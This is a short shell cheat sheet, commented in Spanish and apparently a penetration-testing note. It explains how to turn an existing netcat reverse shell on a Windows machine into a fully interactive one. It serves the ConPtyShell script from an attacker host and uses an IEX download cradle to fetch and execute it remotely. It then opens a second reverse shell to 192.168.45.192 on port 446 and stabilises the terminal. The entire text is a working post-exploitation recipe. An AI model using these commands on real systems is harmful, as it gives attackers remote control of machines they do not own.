```shell
#CONTEXTO: HEMOS CONSEGUIDO UNA REVERSE SHELL CON NC.

#NOS CLONAMOS EL REPOSITORIO
git clone https://github.com/antonioCoco/ConPtyShell
cd ConPtyShell
python3 -m http.server 80

#IMPORTAMOS EL PS1
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.192/Invoke-ConPtyShell.ps1')

#NOS PONEMOS EN ESCUCHA POR OTRO LADO
sudo nc -nlvp 446

#DESDE LA REVERSE SHELL QUE YA TENEMOS INDICAMOS LO SIGUIENTE PARA ABRIR OTRA
Invoke-ConPtyShell -RemoteIp 192.168.45.192 -RemotePort 446 -Rows 46 -Cols 184

#AHORA DESDE LA SEGUNDA REVERSE SHELL
crl+z
	stty raw -echo;fg
	#LE DAMOS DOS VECES AL ENTER Y YA LO TENEMOS.
```